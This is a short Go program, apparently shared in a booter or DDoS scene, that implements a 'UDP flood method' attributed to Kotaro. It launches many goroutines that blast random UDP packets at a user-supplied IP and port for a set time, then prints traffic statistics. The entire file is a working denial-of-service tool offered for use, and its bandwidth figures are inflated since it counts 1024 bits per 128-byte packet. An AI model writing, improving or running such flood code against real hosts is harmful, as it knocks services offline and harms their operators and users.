// UDP FLOOD METHOD BY KOTARO DONT LEAK IT PLS <33
package main

import (
	"fmt"
	"math/rand"
	"net"
	"os"
	"strconv"
	"sync"
	"time"
)

var (
	str   = "asdfghjklqwertyuiopzxcvbnmASDFGHJKLQWERTYUIOPZXCVBNM=&"
	count = 0
	bit   = 0
	stop  = 0
	fail  = 0
)

func init() {
	rand.Seed(time.Now().UnixNano())
}

func main() {
	fmt.Printf("Attacking The Server.. ")
	fmt.Print("Method Made By Kotaroisnice")
	if len(os.Args) != 6 {
		fmt.Printf("Usage: %s <ip> <port> <connections> <seconds> <timeout>\n", os.Args[0])
		fmt.Println("Example: UDP 1.1.1.1 80 1250 60 5")
		os.Exit(1)
	}

	ip := os.Args[1]
	port, err := strconv.Atoi(os.Args[2])
	if err != nil {
		fmt.Println("port should be an integer")
		return
	}
	connections, err := strconv.Atoi(os.Args[3])
	if err != nil {
		fmt.Println("connections should be an integer")
		return
	}
	duration, err := strconv.Atoi(os.Args[4])
	if err != nil {
		fmt.Println("seconds should be an integer")
		return
	}
	// timeout is declared but not used
	_, err = strconv.Atoi(os.Args[5])
	if err != nil {
		fmt.Println("timeout should be an integer")
		return
	}

	var wg sync.WaitGroup

	for i := 0; i < connections; i++ {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			conn, err := net.ListenUDP("udp", &net.UDPAddr{IP: net.ParseIP("0.0.0.0"), Port: 1337 + i})
			if err != nil {
				fmt.Println("Error listening:", err)
				return
			}
			defer conn.Close()
			buffer := make([]byte, 128)
			for {
				if stop > 0 {
					break
				}
				rand.Read(buffer)
				for j := 0; j < 100; j++ {
					_, err := conn.WriteToUDP(buffer, &net.UDPAddr{IP: net.ParseIP(ip), Port: port})
					if err != nil {
						fail++
					} else {
						count++
						bit += 1024
					}
				}
			}
		}(i)
	}

	time.Sleep(time.Duration(duration) * time.Second)
	stop = 1
	wg.Wait()
	fmt.Printf("Total Sent: %d Mb\n", bit/1024/1024)
	fmt.Printf("Mbps: %.2f Mb/s\n", float64(bit)/1024/1024/float64(duration))
	fmt.Printf("PPS: %.2f packets/s\n", float64(count)/float64(duration))
	fmt.Printf("Dropped: %d\n", fail)
}
